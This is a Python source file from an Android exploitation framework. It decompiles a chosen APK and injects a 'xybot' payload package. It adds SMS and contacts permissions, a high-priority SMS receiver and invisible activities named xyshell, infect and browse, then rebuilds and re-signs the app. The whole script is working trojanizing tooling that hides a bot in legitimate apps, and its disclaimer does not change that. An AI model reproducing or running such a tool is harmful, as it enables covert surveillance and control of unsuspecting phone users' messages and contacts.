#!/usr/bin/python
#----------------------------------------------------------------------------------------------#
#Android Framework for Exploitation v-1                                                        #
# (C)opyright 2010 - XYS3C                                                                     #
#---Important----------------------------------------------------------------------------------#
#                     *** Do NOT use this for illegal or malicious use ***                     #
#              The programs are provided as is without any guarantees or warranty.             #
#---Defaults-----------------------------------------------------------------------------------#
import os
import glob
import shutil
import commands
import subprocess as sub
import time
import logging
import signal
import sys
def signal_handler(signal, frame):
	logging.warn("\nYou pressed Ctrl+C! dont forget to clean the TEMP file !")
	print "Wait 5 seconds"
	time.sleep(5)
	sys.exit(0)
signal.signal(signal.SIGINT, signal_handler)
################################################################################################
#                                 MAIN SCREEN                                                  #
################################################################################################

print "---The Android Exploitation Framework ---"
print " _______  _______  _______    _               _______     __   "
print "(  ___  )(  ____ \(  ____ \  ( )  |\     /|  (  __   )   /  \  "
print "| (   ) || (    \/| (    \/  | |  | )   ( |  | (  )  |   \/) ) "
print "| (___) || (__    | (__      (_)  | |   | |  | | /   |     | | "
print "|  ___  ||  __)   |  __)      _   ( (   ) )  | (/ /) |     | | "
print "| (   ) || (      | (        ( )   \ \_/ /   |   / | |     | | "
print "| )   ( || )      | (____/\  | |    \   /    |  (__) | _ __) (_"
print "|/     \||/       (_______/  (_)     \_/     (_______)(_)\____/"
print ""                                                               
print "Copyright Reserved : XYS3C (Visit us at http://xysec.com)"
print"----------------------------------------------------------------"
print "Files Available in the Input Folders:"
print "----LIST----"
os.chdir("../../Input")
for files in glob.glob("*.apk"):
    print "* " + files
origapp = raw_input("Enter the name of the apk you want to inject: ")
print "********************************"
while not os.path.isfile(origapp):
	print "APK not found, try again !"
	print "----LIST-----"
	for files in glob.glob("*.apk"):
	    print "* " + files
	origapp = raw_input("Enter the name of the apk you want to inject: ")
tmp = os.getcwd()+"/../temp"
shutil.copy(origapp,tmp)
os.chdir("../temp")
print "Decompiling Original App"
print "******************"
os.system('../bin/apktool d '+origapp)
print "Decompiled"
print "******************"
tmpfol = origapp.replace(' ', '')[:-4]
print "Injecting Phase 1"
print "******************"
injct = os.getcwd()+"/../bin/xybot"
neworigapp = os.getcwd()+"/"+tmpfol+"/smali/com/xybot"
print "Original App location is set to be " + neworigapp
print "********************************"
print "Injecting services at " + injct
shutil.copytree(injct, neworigapp)
print "********************************"
print "Files injected successfully!! "
dum = raw_input("Press ENTER to continue")

################################################################################################
#                                 CONSTANTS                                                    #
################################################################################################

STYLES = os.getcwd()+"/"+tmpfol+"/res/values/styles.xml"
MANIFEST = os.getcwd()+"/"+tmpfol+"/AndroidManifest.xml"

################################################################################################
#                       Inserting Services and activities in manifest                          #
################################################################################################

def inserting():
 mystring = "\t<activity android:theme=\"@style/Invisiblexysec\" android:label=\"@string/app_name\" android:name=\".XybotActivity\">\n\t<intent-filter>\n\t<action android:name=\"android.intent.action.MAIN\" />\n\t</intent-filter>\n\t</activity>\n\t<receiver android:name=\"com.xybot.SMSReceiver\" android:enabled=\"true\">\n\t\t<intent-filter android:priority=\"10000\">\n\t\t\t<action android:name=\"android.provider.Telephony.SMS_RECEIVED\" />\n\t\t</intent-filter>\n\t</receiver>\n\t<service android:name=\"com.xybot.toastmaker\" />\n\t<activity android:theme=\"@style/Invisiblexysec\" android:name=\"com.xybot.xyshell\" />\n\t<activity android:theme=\"@style/Invisiblexysec\" android:name=\"com.xybot.infect\" />\n\t<activity android:theme=\"@style/Invisiblexysec\" android:name=\"com.xybot.browse\" />\n"
# print mystring
 with open(MANIFEST, "r") as f:
	lines = f.readlines()	
	f.close()
	for i,s in enumerate(lines):
		if "</application>" in s:
			count =i
			break
	count1=int(count)
	
	for i,s in enumerate(lines):
	     count=i
	     
	count2=int(count)

	lines.append("0")
	for i in range(count2,count1-1,-1):
		lines[i+1]=lines[i]

	lines[count1]=mystring
	
	
	f=open(MANIFEST, "w")
	for i in lines:
		f.write(i)	

	f.close()

################################################################################################
#                       Inserting Permissions in manifest                                      #
################################################################################################

def permin(perm):
 mystring = "\t<uses-permission android:name=\""+perm+"\" />\n"
# print mystring
 with open(MANIFEST, "r") as f:
	lines = f.readlines()	
	f.close()
	for i,s in enumerate(lines):
		if "</manifest>" in s:
			count =i
			break
	count1=int(count)
	
	for i,s in enumerate(lines):
	     count=i
	     
	count2=int(count)

	lines.append("0")
	for i in range(count2,count1-1,-1):
		lines[i+1]=lines[i]

	lines[count1]=mystring
	
	
	f=open(MANIFEST, "w")
	for i in lines:
		f.write(i)	

	f.close()
	   
################################################################################################
#                       Inserting Styles in style.xml                                          #
################################################################################################

def styles(tep):
 head = "<?xml version=\"1.0\" encoding=\"utf-8\"?>\n\t<resources>\n"
 string1 = "\t<style name=\"Invisiblexysec\" parent=\"@android:style/Theme\">\n"
 string2 = "\t\t<item name=\"android:windowBackground\">@android:color/transparent</item>\n"
 string3 = "\t\t<item name=\"android:windowNoTitle\">true</item>\n"
 string4 = "\t\t<item name=\"android:windowIsFloating\">true</item>\n"
 string5 = "\t\t<item name=\"android:windowIsTranslucent\">true</item>\n"
 string6 = "\t\t<item name=\"android:windowContentOverlay\">@null</item>\n"
 string7 = "\t\t<item name=\"android:backgroundDimEnabled\">false</item>\n"
 string8 = "\t</style>\n"
 foot = "\t</resources>"
 if tep is 1:
	mystring = string1+string2+string3+string4+string5+string6+string7+string8
 else:
	mystring = head+string1+string2+string3+string4+string5+string6+string7+string8+foot
# print mystring
 if tep is 1:
  with open(STYLES, "r") as f:
	lines = f.readlines()	
	f.close()
	for i,s in enumerate(lines):
		if "</resources>" in s:
			count =i
			break
	count1=int(count)
	
	for i,s in enumerate(lines):
	     count=i
	     
	count2=int(count)
	lines.append("0")
	for i in range(count2,count1-1,-1):
		lines[i+1]=lines[i]
	lines[count1]=mystring
	
	
	f=open(STYLES, "w")
	for i in lines:
		f.write(i)	
	f.close()
 else:
	f=open(STYLES, "w")
	f.write(mystring)
	f.close()
		
################################################################################################
#                       Signing the APK File                                                   #
################################################################################################

ApkToolPath = "../bin"
def sign_apk(fn, fn_new):
    if not fn_new:
        file_path, ext = os.path.splitext(fn)
        fn_new = r'%s_signed%s' %(file_path, ext)
    cmd = '''java -Xmx80m -jar %s/signapk.jar -w %s/testkey.x509.pem %s/testkey.pk8 %s %s''' % (
        ApkToolPath, ApkToolPath, ApkToolPath, fn, fn_new)
    print cmd
    os.system(cmd)
    print 'done!!! ... %s' % fn_new

################################################################################################
#                       Finding Permission exists or not in manifest                           #
################################################################################################

def check(ttpt):
	with open(MANIFEST) as f:  lines = f.read().splitlines()
	for line in lines:
		if line.find(ttpt) >= 0:
		    print line
		    return True
	f.close()	
	return False
	
################################################################################################
#                       Program Flows on Injecting Permission                                  #
################################################################################################

print "Trying to inject permission ! "
print "***********************************************"
if check("android.permission.RECEIVE_SMS"):
    print "Permission 1 Exist"
else:
    print "Injecting Permission !"
    permin("android.permission.RECEIVE_SMS")


if check("android.permission.READ_SMS"):
    print "Permission 2 Exist"
else:
    print "Injecting Permission !"
    permin("android.permission.READ_SMS")

if check("android.permission.WRITE_SMS"):
	print "Permission 3 Exist"
else:
	print "Injecting Permission !"
	permin("android.permission.WRITE_SMS")

if check("android.permission.SEND_SMS"):
	print "Permission 4 Exist"
else:
	print "Injecting Permission !"
	permin("android.permission.SEND_SMS")

if check("android.permission.READ_CONTACTS"):
	print "Permission 5 Exist"
else:
	print "Injecting Permission !"
	permin("android.permission.READ_CONTACTS")
print "***********************************************"
print "Permissions injected successfully!! "

################################################################################################
#                  Program Flows on Injecting Services and Activities                          #
################################################################################################

print "Trying to insert injected Services and Activities !"
print "***********************************************"
inserting()
print "***********************************************"
print "Successfull !"

################################################################################################
#                  Program Flows on Injecting Styles in styles.xml                             #
################################################################################################

print "Inserting Style Values"
print "***********************************************"
if os.path.exists(STYLES):
	styles(1)
else:
	styles(0)
print "***********************************************"
print "Successfull !"	

################################################################################################
#                  Program Flows on Building the modified APK                                  #
################################################################################################

print "Building the APK"
print "***********************************************"
os.system('../bin/apktool b '+tmpfol+" ../Output/"+origapp)
print "***********************************************"
print "Success!"

################################################################################################
#                  Program Flows on Signing the modified APK                                   #
################################################################################################

print "Signing the APK"
print "***********************************************"
sign_apk("../Output/"+origapp,None)
print "***********************************************"
print "Success!"
dum = raw_input("Press ENTER to continue")

################################################################################################
#                  Program Flows on Cleaning the Temporary files                               #
################################################################################################

##### ALWAYS AT THE END TO CLEAR TEMP FILES########
print "Clearing Temporary files"
shutil.rmtree(tmpfol)
os.remove(origapp)
logging.info("The modified APK is replaced/added in the Output folder !")
print "***********************************************"
dum = raw_input("Press ENTER to continue")
logging.warn("Exiting this module !")
time.sleep(3)

